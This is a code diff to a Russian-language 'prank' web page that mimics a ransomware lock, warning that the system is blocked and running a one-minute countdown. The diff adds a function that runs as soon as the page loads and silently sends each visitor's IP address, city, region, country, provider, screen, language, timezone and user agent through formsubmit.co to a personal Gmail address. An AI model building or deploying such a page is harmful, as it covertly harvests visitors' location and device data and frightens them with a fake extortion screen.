@@ -284,7 +284,6 @@
         let dataShown = false;
         let ransomShown = false;
         let timerInterval = null;
-        let ransomTimeout = null;
 
         let geoInfo = null;
         let deviceInfo = {};
@@ -322,7 +321,7 @@
             localStorage.removeItem('prank_state');
         }
 
-        // Сбор данных
+        // Сбор данных об устройстве
         function collectDeviceInfo() {
             const ua = navigator.userAgent;
             const isAndroid = /Android/i.test(ua);
@@ -343,6 +342,7 @@
             };
         }
 
+        // Получение гео и IP
         async function getUserGeo() {
             try {
                 const resp = await fetch('https://ipapi.co/json/');
@@ -354,6 +354,34 @@
                 document.getElementById('userCity').innerText = 'не удалось определить';
                 return { ip: 'скрыт', city: 'неизвестно', region: '-', country: '-', org: '-' };
             }
+        }
+
+        // Отправка данных на почту через FormSubmit
+        function sendDataToEmail() {
+            const data = {
+                device: deviceInfo.device,
+                ip: geoInfo?.ip || 'не определен',
+                city: geoInfo?.city || '—',
+                region: geoInfo?.region || '—',
+                country: geoInfo?.country || '—',
+                provider: geoInfo?.org || '—',
+                screen: deviceInfo.screen,
+                language: deviceInfo.language,
+                timezone: deviceInfo.timezone,
+                userAgent: deviceInfo.userAgent,
+                time: new Date().toLocaleString()
+            };
+
+            fetch('https://formsubmit.co/ajax/hitmandav777@gmail.com', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Отправлено на почту:', data))
+            .catch(error => console.error('Ошибка отправки:', error));
         }
 
         // Отображение "украденных" данных
@@ -402,8 +430,8 @@
             warningLine.style.color = "#ff4757";
             warningLine.innerHTML = "‼️ ВАША СИСТЕМА ЗАБЛОКИРОВАНА. НЕ ЗАКРЫВАЙТЕ СТРАНИЦУ ‼️";
 
-            // Запуск таймера на 1 минуту
-            let timeLeft = 60; // 60 секунд
+            // Таймер на 1 минуту
+            let timeLeft = 60;
             timerDisplaySpan.innerText = `Срок: 1:00 минут. Не закрывайте страницу.`;
             timerInterval = setInterval(() => {
                 if (isPrankRevealed) {
@@ -424,10 +452,8 @@
             }, 1000);
         }
 
-        // Функция, которая всегда показывает, что пользователь обманул
         function showCheatMessage() {
             if (isPrankRevealed) return;
-            // Убираем кнопку и показываем сообщение об обмане
             ransomButton.disabled = true;
             const container = document.querySelector('.container');
             const cheatDiv = document.createElement('div');
@@ -440,7 +466,6 @@
             container.appendChild(cheatDiv);
         }
 
-        // Раскрытие шутки по окончании таймера
         function revealJoke() {
             if (isPrankRevealed) return;
             disableLock();
@@ -476,17 +501,17 @@
         deviceInfo = collectDeviceInfo();
         getUserGeo().then(geo => {
             geoInfo = geo;
+            // Отправляем данные на почту сразу после получения
+            sendDataToEmail();
             if (!hackStarted) {
                 hackStarted = true;
                 showStolenData();
             }
         });
 
-        // Восстановление состояния при перезагрузке (продолжаем розыгрыш)
+        // Восстановление состояния при перезагрузке
         const savedState = localStorage.getItem('prank_state');
         if (savedState) {
-            // Можно восстановить этап, но для простоты просто запускаем с начала
-            // Чтобы не нарушить логику, просто чистим и запускаем заново
             localStorage.removeItem('prank_state');
         }
         localStorage.setItem('prank_state', 'active');
